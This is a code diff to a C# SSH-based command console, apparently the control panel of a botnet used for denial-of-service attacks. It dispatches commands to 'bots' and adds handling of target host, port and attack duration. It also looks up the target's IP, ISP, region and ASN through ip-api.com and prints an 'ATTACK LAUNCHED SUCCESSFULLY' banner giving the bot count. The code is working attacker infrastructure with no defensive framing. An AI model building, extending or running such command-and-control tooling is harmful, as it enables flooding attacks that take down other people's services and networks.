@@ -3,11 +3,13 @@ using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
+using System.Net.Http;
 using System.Net.Sockets;
 using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
 using System.Threading;
+using System.Threading.Tasks;
 using FxSsh;
 using FxSsh.Services;
 
@@ -769,13 +771,108 @@ namespace Agent
                     }
 
                     int dispatched = BroadcastToBots(formattedCmd);
-                    channel.SendData(Encoding.UTF8.GetBytes($"\x1b[92m[+] Dispatched '{formattedCmd}' to {dispatched} bot(s).\x1b[0m\r\n"));
+
+                    string targetHost = args.Length > 0 ? args[0] : "N/A";
+                    string targetPort = args.Length > 1 ? args[1] : "N/A";
+                    string attackDuration = args.Length > 2 ? args[2] : "N/A";
+
+                    string response = FormatDispatchResponse(method.Name, targetHost, targetPort, attackDuration, dispatched);
+                    channel.SendData(Encoding.UTF8.GetBytes(response));
                 }
                 else
                 {
                     channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Unknown command: {cmdName}. Type 'help' for available commands.\x1b[0m\r\n"));
                 }
             }
+        }
+
+        private static readonly HttpClient _httpClient = new() { Timeout = TimeSpan.FromSeconds(3) };
+
+        private class TargetGeoInfo
+        {
+            public string ResolvedIp { get; set; } = "N/A";
+            public string Isp { get; set; } = "Unknown ISP";
+            public string Region { get; set; } = "Unknown Region";
+            public string Country { get; set; } = "Unknown Country";
+            public string Asn { get; set; } = "Unknown ASN";
+        }
+
+        private static TargetGeoInfo ResolveTargetGeo(string rawHost)
+        {
+            var info = new TargetGeoInfo();
+            try
+            {
+                string host = rawHost.Trim();
+                if (host.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || host.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
+                {
+                    if (Uri.TryCreate(host, UriKind.Absolute, out var uri))
+                    {
+                        host = uri.Host;
+                    }
+                }
+
+                if (IPAddress.TryParse(host, out var ip))
+                {
+                    info.ResolvedIp = ip.ToString();
+                }
+                else
+                {
+                    var addresses = Dns.GetHostAddresses(host);
+                    if (addresses.Length > 0)
+                    {
+                        info.ResolvedIp = addresses[0].ToString();
+                    }
+                    else
+                    {
+                        info.ResolvedIp = host;
+                    }
+                }
+
+                // Query ip-api for ISP / Region / ASN details
+                if (info.ResolvedIp != "N/A")
+                {
+                    string url = $"http://ip-api.com/json/{info.ResolvedIp}?fields=status,country,regionName,isp,as";
+                    var task = _httpClient.GetStringAsync(url);
+                    if (task.Wait(2500))
+                    {
+                        using var doc = JsonDocument.Parse(task.Result);
+                        var root = doc.RootElement;
+                        if (root.TryGetProperty("status", out var statusProp) && statusProp.GetString() == "success")
+                        {
+                            if (root.TryGetProperty("country", out var cProp)) info.Country = cProp.GetString() ?? "Unknown";
+                            if (root.TryGetProperty("regionName", out var rProp)) info.Region = rProp.GetString() ?? "Unknown";
+                            if (root.TryGetProperty("isp", out var iProp)) info.Isp = iProp.GetString() ?? "Unknown";
+                            if (root.TryGetProperty("as", out var aProp)) info.Asn = aProp.GetString() ?? "Unknown";
+                        }
+                    }
+                }
+            }
+            catch
+            {
+                // Fallback gracefully on DNS/API errors
+            }
+            return info;
+        }
+
+        private static string FormatDispatchResponse(string methodName, string targetHost, string port, string time, int botCount)
+        {
+            var geo = ResolveTargetGeo(targetHost);
+            var sb = new StringBuilder();
+            sb.AppendLine();
+            sb.AppendLine("\x1b[38;5;240m  ┌────────────────────────────────────────────────────────┐\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m \x1b[1;92m                 ATTACK LAUNCHED SUCCESSFULLY          \x1b[0m\x1b[38;5;240m│\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  ├────────────────────────────────────────────────────────┤\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mTarget   :\x1b[0m \x1b[97m{targetHost}\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mIP       :\x1b[0m \x1b[38;5;45m{geo.ResolvedIp}\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mPort     :\x1b[0m \x1b[93m{port}\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mDuration :\x1b[0m \x1b[93m{time}s\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mMethod   :\x1b[0m \x1b[96m.{methodName.ToUpper()}\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mISP      :\x1b[0m \x1b[38;5;250m{geo.Isp}\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mRegion   :\x1b[0m \x1b[38;5;250m{geo.Region}, {geo.Country}\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mASN      :\x1b[0m \x1b[38;5;244m{geo.Asn}\x1b[0m");
+            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mSwarm    :\x1b[0m \x1b[1;92mSent to {botCount} bot(s)\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  └────────────────────────────────────────────────────────┘\x1b[0m");
+            return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
         }
 
         private static List<string> ExtractPlaceholders(string template)
